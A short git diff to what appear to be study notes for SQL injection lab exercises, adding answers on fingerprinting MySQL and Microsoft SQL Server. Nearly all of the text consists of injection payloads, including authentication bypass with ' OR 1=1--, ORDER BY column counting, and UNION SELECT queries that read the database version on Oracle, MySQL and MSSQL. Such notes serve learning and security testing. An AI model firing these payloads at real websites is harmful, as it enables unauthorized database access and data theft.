@@ -43,3 +43,9 @@ Answer: ' OR 1=1--
 Question:2 SQL injection attack, querying the database type and version on Oracle
 Answer: ' UNION SELECT 'abc', NULL FROM dual-- (To check the table column)
 'UNION SELECT banner, NULL FROM v$version-- (Get the database's version)
+
+Question:3 SQL injection attack, querying the database type and version on MySQL and Microsoft
+Answer: ' order by 1 (it's means 1 column exist)
+-- or # (Both are being used for comment out the content in MySQL and Microsoft SQL)
+
+' UNION SELECT @@version, NULL#
